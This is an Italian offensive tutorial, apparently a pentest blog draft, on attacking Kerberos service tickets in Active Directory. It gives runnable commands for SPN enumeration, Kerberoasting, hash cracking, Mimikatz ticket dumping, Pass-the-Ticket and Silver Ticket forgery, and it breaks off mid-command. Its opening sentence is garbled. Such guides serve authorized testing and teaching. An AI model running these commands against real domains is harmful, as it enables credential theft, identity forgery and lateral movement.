---
title: 'TGS Kerberos: Kerberoasting, Silver Ticket e Service Ticket'
slug: tgs
description: 'Guida offensiva al Ticket-Granting Service (TGS) Kerberos: SPN, Kerberoasting con Rubeus e Impacket, crack offline, Pass-the-Ticket e Silver Ticket Windows AD'
image: /tgs-kerberos-kerberoasting-silver-ticket.webp
draft: true
date: 2026-07-21T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - TGS Kerberos
  - Kerberoasting
  - Silver Ticket
  - Service Ticket
  - Service Principal Name
---

# TGS Kerberos: Kerberoasting, Silver Ticket e Attacchi ai Service Ticket

Il Ticket Granting Service (TGS) è il componente del KDC che e servizio è cifrata con una chiave derivata dalla password dell’account che esegue quel servizio. Se l’account utilizza una password debole, il ticket può essere sottoposto a cracking offline tramite **Kerberoasting**. Se invece possiedi già la chiave dell’account di servizio, puoi creare un **Silver Ticket** senza richiedere un nuovo ticket al Domain Controller.

Dopo aver ottenuto un [TGT Kerberos](https://hackita.it/articoli/tgt-kerberos/), il client può richiedere ticket destinati a servizi specifici del dominio: SQL Server, CIFS, LDAP, HTTP, WinRM, Exchange e molte altre applicazioni integrate con Active Directory.

Questa fase del protocollo è particolarmente interessante durante un penetration test perché:

* qualsiasi utente autenticato può normalmente richiedere Service Ticket per gli SPN pubblicati nel dominio;
* la richiesta non richiede privilegi amministrativi;
* il materiale cifrato può essere analizzato e attaccato offline;
* la compromissione di un singolo service account può aprire percorsi verso database, server applicativi, sistemi di gestione o privilegi di dominio;
* conoscendo la chiave del servizio è possibile forgiare ticket validi senza possedere la password dell’utente impersonato.

Le tecniche principali trattate sono:

* enumerazione degli SPN;
* Kerberoasting con Impacket e Rubeus;
* cracking di ticket RC4 e AES;
* Kerberoasting selettivo;
* utilizzo di ticket già presenti in memoria;
* Pass-the-Ticket con Service Ticket;
* Silver Ticket;
* sostituzione dello SPN con `tgssub`;
* analisi di account utente, computer account e gMSA;
* troubleshooting operativo.

***

## TGS, TGS-REQ, TGS-REP e Service Ticket

Questi termini vengono spesso utilizzati come sinonimi, ma indicano elementi differenti.

| Termine            | Significato                                                                     |
| ------------------ | ------------------------------------------------------------------------------- |
| **TGS**            | Ticket Granting Service, il servizio del KDC che rilascia ticket per le risorse |
| **TGS-REQ**        | Richiesta inviata dal client al KDC per ottenere un ticket                      |
| **TGS-REP**        | Risposta del KDC alla richiesta                                                 |
| **Service Ticket** | Ticket contenuto nella TGS-REP e presentato al servizio target                  |
| **SPN**            | Identificatore Kerberos del servizio richiesto                                  |

Il TGT serve ad autenticarsi verso il KDC. Il Service Ticket serve invece ad autenticarsi verso una risorsa precisa.

Un ticket per:

```text
cifs/fileserver.corp.local
```

non equivale automaticamente a un ticket per:

```text
ldap/dc01.corp.local
```

Il servizio, l’hostname e l’account sul quale è registrato lo SPN determinano dove il ticket può essere utilizzato.

***

## Come Funziona il Flusso TGS-REQ e TGS-REP

```text
CLIENT                                      KDC / DOMAIN CONTROLLER
  │                                                   │
  │──── TGS-REQ ─────────────────────────────────────►│
  │     TGT valido                                    │
  │     Authenticator                                 │
  │     SPN richiesto                                 │
  │     Encryption types supportati                   │
  │                                                   │
  │◄─── TGS-REP ──────────────────────────────────────│
  │     Service Ticket                                │
  │     Session key client-servizio                   │
  │                                                   │
  │──── AP-REQ ───────────────► SERVIZIO TARGET       │
  │     Service Ticket + Authenticator                │
  │                                                   │
  │◄─── AP-REP opzionale ───── SERVIZIO TARGET        │
```

Il client presenta il proprio TGT al Ticket Granting Service e specifica lo SPN della risorsa che vuole raggiungere.

Il KDC restituisce:

1. una copia della session key destinata al client;
2. un Service Ticket destinato al servizio;
3. informazioni sull’identità e sull’autorizzazione dell’utente, normalmente attraverso il PAC.

Il Service Ticket è cifrato con una chiave appartenente all’account sul quale è registrato lo SPN:

* con RC4-HMAC la chiave corrisponde sostanzialmente all’NT hash dell’account;
* con AES128 o AES256 la chiave viene derivata dalla password utilizzando anche il salt Kerberos;
* il client non deve conoscere la password del servizio;
* il servizio può decifrare il ticket perché possiede la stessa chiave.

Il KDC non ha bisogno di contattare il server applicativo durante ogni richiesta. Gli basta conoscere la chiave associata all’account del servizio presente in Active Directory.

Questa architettura rende possibile il Kerberoasting: un utente richiede un ticket legittimo e tenta successivamente di recuperare offline la password che ha generato la chiave del servizio.

***

## SPN: Service Principal Name

Un **Service Principal Name** è l’identificatore univoco utilizzato da Kerberos per associare un’istanza di servizio a un account Active Directory.

Formato generale:

```text
ServiceClass/Host
ServiceClass/Host:Port
ServiceClass/Host:Instance
```

Esempi:

```text
MSSQLSvc/sql01.corp.local:1433
MSSQLSvc/sql01.corp.local:SQLEXPRESS
HTTP/web01.corp.local
cifs/fileserver.corp.local
WSMAN/srv01.corp.local
ldap/dc01.corp.local
```

Quando il client vuole raggiungere SQL Server su `sql01`, richiede un ticket per:

```text
MSSQLSvc/sql01.corp.local:1433
```

Il KDC cerca in Active Directory l’account sul quale è registrato lo SPN e usa la relativa chiave per cifrare il Service Ticket.

Uno SPN duplicato, errato o registrato sull’account sbagliato può provocare errori Kerberos come:

```text
KDC_ERR_S_PRINCIPAL_UNKNOWN
KDC_ERR_PRINCIPAL_NOT_UNIQUE
KRB_AP_ERR_MODIFIED
```

***

## Quali Account Sono Interessanti per il Kerberoasting

Tecnicamente, qualsiasi account con uno SPN può ricevere un Service Ticket. Dal punto di vista operativo, però, non tutti gli account hanno lo stesso valore.

### Account utente con SPN

Sono i target principali:

```text
svc_sql
svc_web
svc_backup
svc_sccm
svc_sharepoint
svc_exchange
```

Questi account spesso utilizzano password:

* impostate manualmente;
* molto vecchie;
* escluse dalla scadenza;
* condivise tra più server;
* basate sul nome del servizio o dell’azienda;
* appartenenti ad account con privilegi elevati.

Un account utente con SPN e password gestita manualmente è il classico account **Kerberoastable**.

### Computer account

Anche i computer account possiedono numerosi SPN:

```text
HOST/ws01.corp.local
cifs/ws01.corp.local
TERMSRV/ws01.corp.local
RestrictedKrbHost/ws01.corp.local
```

Sono tecnicamente richiedibili e le versioni moderne di Impacket permettono anche di selezionarli esplicitamente.

Tuttavia la password di un computer account Windows è normalmente:

* casuale;
* molto lunga;
* modificata automaticamente;
* estremamente resistente al cracking offline.

Di conseguenza, un ticket appartenente a `WS01$` è normalmente inutile per il cracking, ma può diventare importante se la chiave del computer account è già stata recuperata tramite credential dumping, delegazione, abuso ACL o compromissione dell’host.

### gMSA

I Group Managed Service Accounts utilizzano password casuali di 240 byte, gestite automaticamente da Windows e ruotate normalmente ogni 30 giorni.

Un gMSA può avere SPN ed essere tecnicamente roastabile, ma il cracking del ticket non rappresenta un percorso realistico.

Il vettore offensivo corretto consiste nel verificare se l’account controllato possiede il diritto di leggere:

```text
msDS-ManagedPassword
```

Se puoi recuperare il segreto del gMSA, non hai bisogno di crackare il Service Ticket.

***

## Service Class ad Alto Valore

| Service class      | Servizio associato               | Valore potenziale                                     |
| ------------------ | -------------------------------- | ----------------------------------------------------- |
| `MSSQLSvc`         | Microsoft SQL Server             | Database, impersonation, linked server, `xp_cmdshell` |
| `HTTP`             | IIS, SharePoint, web application | Accesso applicativo o amministrativo                  |
| `WSMAN`            | WinRM / PowerShell Remoting      | Sessione remota se autorizzato                        |
| `cifs`             | SMB e file share                 | Accesso a condivisioni e file                         |
| `ldap`             | Active Directory LDAP            | Query directory e operazioni LDAP autorizzate         |
| `HOST`             | Servizi host generici            | Utilizzabile da diversi componenti Windows            |
| `TERMSRV`          | Remote Desktop Services          | Autenticazione verso RDP                              |
| `exchangeMDB`      | Exchange Mailbox                 | Accesso a componenti Exchange                         |
| `exchangeAB`       | Exchange Address Book            | Servizi rubrica Exchange                              |
| `MSOLAP`           | SQL Server Analysis Services     | Accesso a dati BI                                     |
| `ReportingService` | SQL Server Reporting Services    | Report e dati applicativi                             |
| `CmRcService`      | SCCM Remote Control              | Infrastruttura di gestione endpoint                   |
| `MSOMSdkSvc`       | SCOM SDK                         | System Center Operations Manager                      |
| `AgpmServer`       | Advanced Group Policy Management | Gestione avanzata delle GPO                           |
| `AFServer`         | PI Asset Framework               | Infrastrutture OT e industriali                       |

La service class da sola non determina i privilegi dell’account. Devi sempre analizzare:

* gruppi;
* ACL;
* sessioni;
* host sui quali l’account è amministratore;
* delegation settings;
* privilegi applicativi;
* relazioni BloodHound;
* password age;
* `adminCount`;
* `msDS-SupportedEncryptionTypes`.

***

## Enumerazione SPN da Linux con Impacket

### Elencare gli account utente con SPN

```bash
impacket-GetUserSPNs 'corp.local/user:Password123!' \
  -dc-ip 10.10.10.5
```

Output tipico:

```text
ServicePrincipalName                   Name       MemberOf       PasswordLastSet
-------------------------------------  ---------  -------------  -------------------
MSSQLSvc/sql01.corp.local:1433         svc_sql    Domain Users   2021-03-15
HTTP/sharepoint.corp.local             svc_sp     Domain Users   2020-08-10
```

### Autenticazione tramite NT hash

```bash
impacket-GetUserSPNs corp.local/user \
  -hashes ':NTHASH' \
  -dc-ip 10.10.10.5
```

### Autenticazione tramite ticket Kerberos già disponibile

```bash
export KRB5CCNAME=/tmp/user.ccache

impacket-GetUserSPNs corp.local/user \
  -k -no-pass \
  -dc-ip 10.10.10.5
```

### Enumerazione cross-domain

```bash
impacket-GetUserSPNs child.corp.local/user:'Password123!' \
  -target-domain corp.local \
  -dc-ip 10.10.10.5
```

In presenza di trust, può essere utile cercare service account anche nei domini collegati.

### Enumerare computer account con SPN

Le versioni moderne di Impacket supportano anche l’enumerazione e la richiesta di ticket per machine account:

```bash
impacket-GetUserSPNs 'corp.local/user:Password123!' \
  -dc-ip 10.10.10.5 \
  -machine-only
```

Richiesta per un computer specifico:

```bash
impacket-GetUserSPNs 'corp.local/user:Password123!' \
  -dc-ip 10.10.10.5 \
  -request-machine 'WS01$' \
  -save
```

Questa opzione è utile soprattutto per analisi Kerberos avanzate. Non aspettarti di crackare una password macchina generata automaticamente.

***

## Enumerazione SPN da Windows

### SetSPN

```cmd
setspn -T corp.local -Q */*
```

Cercare una service class specifica:

```cmd
setspn -T corp.local -Q MSSQLSvc/*
setspn -T corp.local -Q HTTP/*
setspn -T corp.local -Q WSMAN/*
```

Cercare dove è registrato uno SPN preciso:

```cmd
setspn -Q MSSQLSvc/sql01.corp.local:1433
```

Elencare gli SPN di un account:

```cmd
setspn -L corp\svc_sql
```

### PowerView

```powershell
Get-DomainUser -SPN |
    Select-Object samaccountname,
                  serviceprincipalname,
                  pwdlastset,
                  memberof,
                  admincount
```

Solo account con `adminCount=1`:

```powershell
Get-DomainUser -LDAPFilter "(&(servicePrincipalName=*)(adminCount=1))" |
    Select-Object samaccountname,
                  serviceprincipalname,
                  pwdlastset,
                  memberof
```

### Modulo Active Directory

```powershell
Get-ADUser -LDAPFilter "(servicePrincipalName=*)" \
  -Properties ServicePrincipalName,
              PasswordLastSet,
              MemberOf,
              AdminCount,
              PasswordNeverExpires,
              msDS-SupportedEncryptionTypes |
  Select-Object SamAccountName,
                PasswordLastSet,
                PasswordNeverExpires,
                AdminCount,
                ServicePrincipalName,
                msDS-SupportedEncryptionTypes
```

### LDAP nativo

```powershell
$searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$searcher.PropertiesToLoad.AddRange(@(
    "samaccountname",
    "serviceprincipalname",
    "pwdlastset",
    "memberof",
    "admincount",
    "msds-supportedencryptiontypes"
))

$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        User   = $_.Properties.samaccountname
        SPN    = $_.Properties.serviceprincipalname -join ", "
        Groups = $_.Properties.memberof -join ", "
        AdminCount = $_.Properties.admincount
        ETypes = $_.Properties.'msds-supportedencryptiontypes'
    }
}
```

***

## Prioritizzare i Target

Richiedere ticket per centinaia di account senza alcun criterio produce molto materiale inutile. Conviene classificare prima gli account.

Priorità elevata:

* account con `adminCount=1`;
* membri di gruppi privilegiati;
* account con password molto vecchia;
* `PasswordNeverExpires`;
* service account usati su più server;
* account con ACL interessanti;
* account amministratori locali su server;
* MSSQL, SCCM, SCOM, backup, Exchange e SharePoint;
* account che supportano ancora RC4;
* account con nome legato all’azienda o all’applicazione.

### Rubeus: statistiche senza richiedere ticket

```powershell
.\Rubeus.exe kerberoast /stats
```

Con LDAP cifrato:

```powershell
.\Rubeus.exe kerberoast /stats /ldaps
```

### Filtrare account privilegiati

```powershell
.\Rubeus.exe kerberoast \
  /ldapfilter:"admincount=1" \
  /outfile:admin_hashes.txt
```

### Filtrare password vecchie

```powershell
.\Rubeus.exe kerberoast \
  /pwdsetbefore:01-01-2023 \
  /outfile:old_passwords.txt
```

### Limitare il numero di risultati

```powershell
.\Rubeus.exe kerberoast \
  /pwdsetbefore:01-01-2023 \
  /resultlimit:5 \
  /outfile:priority_hashes.txt
```

La combinazione più utile durante un assessment è spesso:

```powershell
.\Rubeus.exe kerberoast \
  /ldapfilter:"admincount=1" \
  /pwdsetbefore:01-01-2024 \
  /resultlimit:10 \
  /outfile:priority_hashes.txt
```

***

## Kerberoasting con Impacket

### Richiedere tutti i ticket disponibili

```bash
impacket-GetUserSPNs 'corp.local/user:Password123!' \
  -dc-ip 10.10.10.5 \
  -request \
  -outputfile kerberoast.txt
```

### Richiedere il ticket di un account specifico

```bash
impacket-GetUserSPNs 'corp.local/user:Password123!' \
  -dc-ip 10.10.10.5 \
  -request-user svc_sql \
  -outputfile svc_sql.txt
```

### Utilizzare un NT hash per autenticarsi

```bash
impacket-GetUserSPNs corp.local/user \
  -hashes ':NTHASH' \
  -dc-ip 10.10.10.5 \
  -request \
  -outputfile kerberoast.txt
```

### Utilizzare una chiave AES

```bash
impacket-GetUserSPNs corp.local/user \
  -aesKey AES256_KEY \
  -dc-ip 10.10.10.5 \
  -request \
  -outputfile kerberoast.txt
```

### Utilizzare un TGT già presente nella cache

```bash
export KRB5CCNAME=/tmp/user.ccache

impacket-GetUserSPNs corp.local/user \
  -k -no-pass \
  -dc-ip 10.10.10.5 \
  -request \
  -outputfile kerberoast.txt
```

### Evitare di forzare RC4 per il TGT iniziale

Le versioni recenti di Impacket espongono l’opzione:

```bash
-no-rc4
```

Esempio:

```bash
impacket-GetUserSPNs 'corp.local/user:Password123!' \
  -dc-ip 10.10.10.5 \
  -request \
  -no-rc4 \
  -outputfile kerberoast.txt
```

Questa opzione evita di forzare RC4-HMAC durante l’ottenimento del TGT iniziale. Il tipo di cifratura del Service Ticket dipende comunque dalle chiavi disponibili sull’account target e dalla negoziazione Kerberos.

***

## Kerberoasting con Rubeus

### Tutti gli account Kerberoastable

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

### Account specifico

```powershell
.\Rubeus.exe kerberoast \
  /user:svc_sql \
  /outfile:svc_sql.txt
```

### SPN specifico

```powershell
.\Rubeus.exe kerberoast \
  /spn:"MSSQLSvc/sql01.corp.local:1433" \
  /outfile:sql_ticket.txt
```

### Lista di SPN

```powershell
.\Rubeus.exe kerberoast \
  /spns:C:\Temp\spns.txt \
  /outfile:hashes.txt
```

Contenuto di `spns.txt`:

```text
MSSQLSvc/sql01.corp.local:1433
HTTP/sharepoint.corp.local
WSMAN/srv01.corp.local
```

### Output non spezzato

```powershell
.\Rubeus.exe kerberoast /nowrap
```

### Richieste scaglionate

```powershell
.\Rubeus.exe kerberoast \
  /delay:5000 \
  /jitter:30 \
  /outfile:hashes.txt
```

`/delay` indica la pausa in millisecondi tra le richieste. `/jitter` introduce una variazione percentuale.

In un test autorizzato, questi parametri permettono di controllare il ritmo dell’attività ed evitare picchi artificiali non rappresentativi dello scenario che stai simulando.

### Ticket AES

```powershell
.\Rubeus.exe kerberoast \
  /aes \
  /outfile:aes_hashes.txt
```

### RC4 su account che non risultano AES-enabled

```powershell
.\Rubeus.exe kerberoast \
  /rc4opsec \
  /outfile:rc4_hashes.txt
```

`/rc4opsec` utilizza il meccanismo `tgtdeleg` e filtra gli account che risultano configurati per AES, concentrandosi sui target per i quali RC4 è ancora previsto.

Non equivale a “rendere invisibile” l’attività. Le richieste rimangono osservabili nei log Kerberos.

### Richiedere RC4 tramite TGT delegation

```powershell
.\Rubeus.exe kerberoast \
  /usetgtdeleg \
  /outfile:hashes.txt
```

Questa modalità può richiedere RC4 anche per account che supportano AES. In ambienti moderni può apparire come downgrade della cifratura ed essere molto più evidente rispetto a una normale richiesta AES.

***

## Kerberoasting Senza Credenziali tramite Account No-Preauth

Le versioni recenti di Rubeus e Impacket supportano scenari nei quali un account con Kerberos pre-authentication disabilitata viene utilizzato per richiedere direttamente materiale relativo a uno SPN.

Con Rubeus:

```powershell
.\Rubeus.exe kerberoast \
  /spn:"MSSQLSvc/sql01.corp.local:1433" \
  /nopreauth:legacy_user \
  /domain:corp.local \
  /dc:dc01.corp.local \
  /nowrap
```

Con più SPN:

```powershell
.\Rubeus.exe kerberoast \
  /spns:C:\Temp\spns.txt \
  /nopreauth:legacy_user \
  /domain:corp.local \
  /dc:dc01.corp.local \
  /outfile:hashes.txt
```

Impacket supporta inoltre richieste basate su utenti o SPN forniti tramite file:

```bash
impacket-GetUserSPNs corp.local/ \
  -no-preauth legacy_user \
  -usersfile targets.txt \
  -dc-ip 10.10.10.5 \
  -outputfile hashes.txt
```

Questa tecnica non va confusa con il normale AS-REP Roasting. L’obiettivo non è necessariamente crackare l’AS-REP dell’utente no-preauth, ma utilizzare quel principal per ottenere materiale relativo ai servizi indicati.

***

## RC4 e Kerberoasting nel 2026

RC4 è stato storicamente il tipo di cifratura preferito nel Kerberoasting perché:

* la chiave RC4 corrisponde all’NT hash;
* il cracking è sensibilmente più rapido rispetto ad AES;
* molti service account legacy continuano a supportarlo;
* vecchie configurazioni AD lo negoziano ancora per compatibilità.

La situazione è però cambiata.

Con gli aggiornamenti Windows del luglio 2026, Microsoft ha avviato la fase finale dell’hardening Kerberos collegato a CVE-2026-20833. Il comportamento predefinito dei Domain Controller passa sempre più verso AES, mentre le dipendenze RC4 devono essere configurate esplicitamente o possono provocare errori di autenticazione.

Conseguenze pratiche:

* `/rc4opsec` può restituire pochi o nessun account;
* richieste RC4 possono fallire nei domini aggiornati;
* alcuni esempi storici di Kerberoasting non funzionano più senza configurazioni legacy;
* AES128 e AES256 diventano più comuni;
* il cracking offline rimane possibile, ma è più costoso;
* un ticket RC4 in un dominio AES-first è un indicatore molto più forte.

Prima di basare un test su RC4, controlla:

```powershell
Get-ADUser svc_sql \
  -Properties msDS-SupportedEncryptionTypes |
  Select-Object SamAccountName,
                msDS-SupportedEncryptionTypes
```

E analizza i ticket con:

```cmd
klist
```

Oppure:

```powershell
.\Rubeus.exe describe /ticket:service_ticket.kirbi
```

***

## Crack Offline con Hashcat

### TGS-REP RC4 — Etype 23

```bash
hashcat -m 13100 kerberoast.txt rockyou.txt
```

Con regole:

```bash
hashcat -m 13100 kerberoast.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

Mostrare i risultati:

```bash
hashcat -m 13100 kerberoast.txt --show
```

### TGS-REP AES128 — Etype 17

```bash
hashcat -m 19600 aes128_hashes.txt rockyou.txt
```

### TGS-REP AES256 — Etype 18

```bash
hashcat -m 19700 aes256_hashes.txt rockyou.txt
```

### Attacco combinato

```bash
hashcat -m 13100 kerberoast.txt \
  company_words.txt \
  seasons.txt \
  -a 1
```

### Mask attack

Esempio per pattern come `Summer2026!`:

```bash
hashcat -m 13100 kerberoast.txt \
  -a 3 \
  '?u?l?l?l?l?l?d?d?d?d!'
```

Una mask generica raramente è efficiente. Conviene costruire candidate basate su:

* nome azienda;
* nome prodotto;
* hostname del servizio;
* reparto;
* stagione;
* anno;
* mese;
* suffisso numerico;
* carattere speciale;
* convenzioni interne individuate durante il test.

Esempio wordlist mirata:

```text
Corp2026!
CorpSQL2026!
SqlService2026!
Database2026!
Summer2026!
Backup2026!
SharePoint2026!
```

### Prince processor

```bash
pp64.bin company_words.txt |
  hashcat -m 13100 kerberoast.txt
```

### John the Ripper

```bash
john \
  --format=krb5tgs \
  --wordlist=rockyou.txt \
  kerberoast.txt
```

Visualizzare la password recuperata:

```bash
john --show --format=krb5tgs kerberoast.txt
```

***

## Perché AES è Più Difficile da Crackare

AES Kerberoasting non rende il service account immune.

La differenza principale è il costo computazionale:

* RC4 utilizza una derivazione più semplice;
* AES usa una string-to-key più costosa;
* il cracking AES è molto più lento;
* le password deboli rimangono comunque vulnerabili;
* una wordlist mirata può ancora avere successo.

Un account con password:

```text
Company2026!
```

rimane un target valido anche se usa AES256.

Un account con password casuale lunga 30–40 caratteri non è un target realistico né con RC4 né con AES.

***

## Recuperare Service Ticket Già Presenti in Memoria

Non sempre devi richiedere un nuovo ticket al KDC. Un host compromesso può avere Service Ticket già presenti nella cache Kerberos.

### Visualizzare i ticket correnti

```cmd
klist
```

Con Rubeus:

```powershell
.\Rubeus.exe triage
```

Con privilegi elevati:

```powershell
.\Rubeus.exe triage /luid:0x3e7
```

### Dump dei ticket con Rubeus

```powershell
.\Rubeus.exe dump /nowrap
```

Filtrare per servizio:

```powershell
.\Rubeus.exe dump \
  /service:MSSQLSvc \
  /nowrap
```

Filtrare per utente:

```powershell
.\Rubeus.exe dump \
  /user:administrator \
  /nowrap
```

### Dump con Mimikatz

```powershell
.\mimikatz.exe \
  "privilege::debug" \
  "sekurlsa::tickets /export" \
  "exit"
```

I ticket vengono salvati normalmente in formato `.kirbi`.

### Convertire KIRBI in CCACHE

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

In alcune installazioni:

```bash
ticketConverter.py ticket.kirbi ticket.ccache
```

Caricare la cache:

```bash
export KRB5CCNAME=$PWD/ticket.ccache
klist
```

***

## Pass-the-Ticket con un Service Ticket

Un Service Ticket può essere iniettato o caricato in una sessione e utilizzato senza conoscere la password dell’utente.

A differenza di un TGT, però, il Service Ticket è limitato allo SPN per il quale è stato rilasciato.

### Windows con Rubeus

```powershell
.\Rubeus.exe ptt /ticket:service_ticket.kirbi
```

Oppure Base64:

```powershell
.\Rubeus.exe ptt /ticket:doIF...BASE64...==
```

Verifica:

```cmd
klist
```

Utilizzo di un ticket CIFS:

```cmd
dir \\fileserver.corp.local\C$
```

Utilizzo di un ticket MSSQL:

```cmd
sqlcmd -S sql01.corp.local -E
```

### Sessione isolata con `createnetonly`

```powershell
.\Rubeus.exe createnetonly \
  /program:"C:\Windows\System32\cmd.exe" \
  /show \
  /ticket:service_ticket.kirbi
```

Questo crea una nuova logon session di tipo network-only e inserisce il ticket senza contaminare la cache Kerberos della sessione principale.

### Linux con Impacket

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
```

Ticket CIFS:

```bash
impacket-smbclient \
  -k -no-pass \
  corp.local/Administrator@fileserver.corp.local
```

Ticket MSSQL:

```bash
impacket-mssqlclient \
  -k -no-pass \
  corp.local/Administrator@sql01.corp.local
```

Il nome utilizzato dal client deve corrispondere allo SPN contenuto nel ticket. Usare direttamente l’indirizzo IP spesso provoca fallback NTLM o errori Kerberos.

***

## Cosa Fare Dopo Aver Crackato un Service Account

Una password recuperata non implica automaticamente privilegi amministrativi. Devi verificare dove e come l’account può essere utilizzato.

### Test SMB

```bash
nxc smb 10.10.10.0/24 \
  -u svc_sql \
  -p 'RecoveredPassword!' \
  -d corp.local
```

Enumerare share:

```bash
nxc smb 10.10.10.0/24 \
  -u svc_sql \
  -p 'RecoveredPassword!' \
  -d corp.local \
  --shares
```

### LDAP

```bash
nxc ldap dc01.corp.local \
  -u svc_sql \
  -p 'RecoveredPassword!' \
  -d corp.local \
  --users
```

### BloodHound

```bash
bloodhound-python \
  -u svc_sql \
  -p 'RecoveredPassword!' \
  -d corp.local \
  -ns 10.10.10.5 \
  -c All
```

Oppure con NetExec:

```bash
nxc ldap dc01.corp.local \
  -u svc_sql \
  -p 'RecoveredPassword!' \
  -d corp.local \
  --bloodhound \
  --collection All
```

### MSSQL

```bash
impacket-mssqlclient \
  'corp.local/svc_sql:RecoveredPassword!@sql01.corp.local'
```

Comandi iniziali:

```text
enum_logins
enum_impersonate
enum_links
enable_xp_cmdshell
xp_cmdshell whoami
```

L’abilitazione di `xp_cmdshell` richiede privilegi adeguati. Prima verifica impersonation e linked server.

### WinRM

```bash
evil-winrm \
  -i srv01.corp.local \
  -u svc_sql \
  -p 'RecoveredPassword!'
```

### Kerberos con password recuperata

```bash
impacket-getTGT \
  'corp.local/svc_sql:RecoveredPassword!'
```

```bash
export KRB5CCNAME=svc_sql.ccache
```

Da questo punto puoi utilizzare strumenti Impacket con:

```bash
-k -no-pass
```

***

## Silver Ticket

Un **Silver Ticket** è un Service Ticket forgiato utilizzando la chiave dell’account che esegue il servizio target.

Differenza principale:

| Golden Ticket                         | Silver Ticket                                  |
| ------------------------------------- | ---------------------------------------------- |
| Richiede la chiave di `krbtgt`        | Richiede la chiave del servizio                |
| Permette di richiedere più servizi    | È limitato allo specifico servizio o account   |
| Forgia un TGT                         | Forgia un Service Ticket                       |
| Coinvolge l’intero dominio            | Colpisce una risorsa più limitata              |
| Può generare successive richieste TGS | Può essere presentato direttamente al servizio |

Prerequisiti:

* NT hash oppure chiave AES dell’account di servizio;
* SID del dominio;
* SPN esatto del servizio;
* hostname corretto;
* nome dell’utente da rappresentare;
* gruppi e RID da inserire nel ticket;
* conoscenza dell’account sul quale è registrato lo SPN.

Il servizio tenta di decifrare il ticket con la propria chiave. Se la chiave è corretta e il ticket è coerente, può accettare l’identità forgiata.

Alcuni servizi o configurazioni possono eseguire validazione aggiuntiva del PAC verso il Domain Controller. Il Silver Ticket non deve quindi essere considerato universalmente “offline” o sempre accettato.

***

## Recuperare il SID del Dominio

Da Windows:

```cmd
whoami /user
```

Esempio:

```text
S-1-5-21-111111111-222222222-333333333-1105
```

Il SID del dominio è:

```text
S-1-5-21-111111111-222222222-333333333
```

PowerShell:

```powershell
Get-ADDomain | Select-Object DomainSID
```

Da Linux con Impacket:

```bash
impacket-lookupsid \
  'corp.local/user:Password123!@dc01.corp.local'
```

***

## Silver Ticket con Impacket

### CIFS con hash del computer account

Se possiedi l’NT hash di:

```text
FILESERVER$
```

puoi creare un ticket per:

```text
cifs/fileserver.corp.local
```

```bash
impacket-ticketer \
  -nthash MACHINE_ACCOUNT_NT_HASH \
  -domain-sid S-1-5-21-111111111-222222222-333333333 \
  -domain corp.local \
  -spn cifs/fileserver.corp.local \
  Administrator
```

Il tool crea:

```text
Administrator.ccache
```

Caricamento:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
```

Accesso SMB:

```bash
impacket-smbclient \
  -k -no-pass \
  corp.local/Administrator@fileserver.corp.local
```

### MSSQL con account di servizio

```bash
impacket-ticketer \
  -nthash SERVICE_ACCOUNT_NT_HASH \
  -domain-sid S-1-5-21-111111111-222222222-333333333 \
  -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  Administrator
```

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
```

```bash
impacket-mssqlclient \
  -k -no-pass \
  corp.local/Administrator@sql01.corp.local
```

### Silver Ticket con chiave AES256

```bash
impacket-ticketer \
  -aesKey SERVICE_ACCOUNT_AES256_KEY \
  -domain-sid S-1-5-21-111111111-222222222-333333333 \
  -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  Administrator
```

AES è particolarmente importante nei domini moderni nei quali RC4 è disabilitato o non più negoziato automaticamente.

***

## Silver Ticket con Mimikatz

### CIFS

```powershell
.\mimikatz.exe \
  "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-111111111-222222222-333333333 /target:fileserver.corp.local /service:cifs /rc4:MACHINE_ACCOUNT_NT_HASH /ptt" \
  "exit"
```

Verifica:

```cmd
klist
dir \\fileserver.corp.local\C$
```

### MSSQL

```powershell
.\mimikatz.exe \
  "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-111111111-222222222-333333333 /target:sql01.corp.local /service:MSSQLSvc /rc4:SERVICE_ACCOUNT_NT_HASH /ptt" \
  "exit"
```

Con AES:

```powershell
.\mimikatz.exe \
  "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-111111111-222222222-333333333 /target:sql01.corp.local /service:MSSQLSvc /aes256:SERVICE_ACCOUNT_AES256_KEY /ptt" \
  "exit"
```

Il comando Mimikatz si chiama `kerberos::golden`, ma viene utilizzato anche per creare Silver Ticket quando specifichi `/target` e `/service` con la chiave del servizio invece della chiave di `krbtgt`.

***

## Service Class Utili nei Silver Ticket

| SPN                  | Utilizzo principale                              |
| -------------------- | ------------------------------------------------ |
| `cifs/host`          | File share SMB                                   |
| `MSSQLSvc/host:port` | SQL Server                                       |
| `HTTP/host`          | IIS e applicazioni HTTP con Kerberos             |
| `WSMAN/host`         | WinRM                                            |
| `HOST/host`          | Servizi Windows che utilizzano il principal HOST |
| `LDAP/dc`            | Operazioni LDAP autorizzate                      |
| `TERMSRV/host`       | Remote Desktop Services                          |
| `RPCSS/host`         | Componenti RPC e DCOM                            |

La presenza di un ticket valido non concede automaticamente l’autorizzazione richiesta. Il servizio può:

* verificare gruppi e SID nel PAC;
* applicare ACL locali;
* richiedere privilegi applicativi;
* rifiutare ticket con SPN errato;
* eseguire validazione aggiuntiva;
* utilizzare un account differente da quello che hai compromesso.

Per esempio, un ticket LDAP non concede automaticamente DCSync. Sono comunque necessari i diritti di replica appropriati.

***

## TGS Substitution con Rubeus `tgssub`

Rubeus permette di sostituire il service name presente in un ticket già ottenuto.

Questa tecnica è utile quando più servizi:

* vengono eseguiti sotto lo stesso account;
* usano la stessa chiave Kerberos;
* appartengono allo stesso computer account;
* sono collegati a scenari S4U o delegazione.

### Sintassi

```powershell
.\Rubeus.exe tgssub \
  /ticket:original_ticket.kirbi \
  /altservice:host/server.corp.local \
  /ptt
```

Esempio da CIFS a HOST:

```powershell
.\Rubeus.exe tgssub \
  /ticket:cifs_ticket.kirbi \
